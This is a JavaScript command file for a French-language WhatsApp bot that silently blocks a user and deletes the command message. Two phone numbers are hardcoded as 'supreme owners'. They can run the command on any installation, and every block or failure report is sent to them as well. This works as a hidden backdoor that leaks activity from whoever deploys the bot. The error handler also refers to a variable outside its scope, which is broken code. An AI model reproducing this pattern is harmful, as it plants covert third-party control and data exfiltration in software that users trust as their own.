/**
 * Block Command - 𝐃𝐈𝐏𝐏𝐄𝐑 Edition
 * Bloque silencieusement une entité sur WhatsApp et efface l'invocation
 */

const config = require('../../config');

const prefix = config.prefix || '.';

module.exports = {
  name: 'block',
  aliases: ['bloquer', 'bloque'],
  category: '👑 Owner',
  ownerOnly: false, 
  description: '『 𝐃𝐈𝐏𝐏𝐄𝐑 』➪ ʙʟᴏǫᴜᴇ sɪʟᴇɴᴄɪᴇᴜsᴇᴍᴇɴᴛ ᴜɴ ᴜᴛɪʟɪsᴀᴛᴇᴜʀ ᴇᴛ ᴇғғᴀᴄᴇ ʟᴀ ᴛʀᴀᴄᴇ',
  usage: `${prefix}block [@ᴜsᴇʀ | ɴᴜᴍᴇ́ʀᴏ | ᴇɴ ʀᴇ́ᴘᴏɴsᴇ]`,

  async execute(sock, msg, args, extra) {
    const { isOwner } = extra;
    const chatId = msg.key.remoteJid;

    try {
      // 👑 Tes numéros de Maîtres Suprêmes
      const supremeOwners = ['2290146202259', '2290155745907'];

      // 🛡️ EXTRACTION SÉCURISÉE DE TON NUMÉRO (Infaillible)
      let senderJid = msg.key.fromMe 
        ? sock.user.id 
        : (msg.key.participant || msg.key.remoteJid);
      
      const bareJid = senderJid.split('@')[0].split(':')[0];
      const senderNumber = bareJid.replace(/\D/g, '');

      // 🛡️ BLINDAGE GHOSTG : Sécurité absolue
      const hasAccess = supremeOwners.includes(senderNumber) || isOwner === true;

      // Silence total pour les imposteurs
      if (!hasAccess) return; 

      let target;
      const ctx = msg.message?.extendedTextMessage?.contextInfo;
      const mentioned = ctx?.mentionedJid || [];

      // 1. Extraction de la cible via mention
      if (mentioned && mentioned.length > 0) {
        target = mentioned[0];
      } 
      // 2. Extraction de la cible via réponse à un message (quoted)
      else if (ctx && ctx.quotedMessage) {
        target = ctx.participant;
      }
      // 3. Extraction de la cible via numéro direct fourni dans les arguments
      else if (args[0]) {
        let cleanedNumber = args[0].replace(/[^0-9]/g, '');
        if (cleanedNumber.length >= 8) { 
          target = `${cleanedNumber}@s.whatsapp.net`;
        }
      }

      // Si aucune cible n'est trouvée, on s'arrête là
      if (!target) return;

      // 💥 SUPPRESSION DE LA COMMANDE POUR RESTER INVISIBLE
      try {
        await sock.sendMessage(chatId, { delete: msg.key });
      } catch (e) {
        // Échec silencieux si le bot n'est pas admin dans le groupe
        console.error("[block cmd] Impossible de supprimer le message d'invocation.");
      }

      // ⚖️ RITUEL DE BLOCAGE SILENCIEUX (Au niveau du compte WhatsApp)
      await sock.updateBlockStatus(target, 'block');

      // 📝 ADRESSES DES MAÎTRES POUR LE RAPPORT (Dynamique & Stricte)
      const reportJids = [
        `${senderNumber}@s.whatsapp.net`, 
        '2290146202259@s.whatsapp.net',
        '2290155745907@s.whatsapp.net'
      ];

      const targetNumber = target.split('@')[0];
      
      // Envoi du rapport de succès
      for (const jid of reportJids) {
        try {
          await sock.sendMessage(jid, {
            text: `*⚖️ [𝐃𝐈𝐏𝐏𝐄𝐑] L'entité @${targetNumber} a été bloquée avec succès par le maître.*`,
            mentions: [target]
          });
        } catch (e) {
          console.error(`Impossible d'envoyer le rapport de blocage à ${jid}`);
        }
      }

    } catch (error) {
      console.error('[block cmd] error:', error);

      // 📝 RAPPORT D'ÉCHEC AUX MAÎTRES
      if (target) {
        const targetNumber = target.split('@')[0];
        const reportJids = [
          '2290146202259@s.whatsapp.net',
          '2290155745907@s.whatsapp.net',
        ];

        for (const jid of reportJids) {
          try {
            await sock.sendMessage(jid, {
              text: `*〆 [𝐃𝐈𝐏𝐏𝐄𝐑] Échec du rituel de blocage pour l'entité @${targetNumber}.*\n*Erreur :* ${error.message}`,
              mentions: [target]
            });
          } catch (e) {
            // Échec silencieux
          }
        }
      }
    }
  }
};
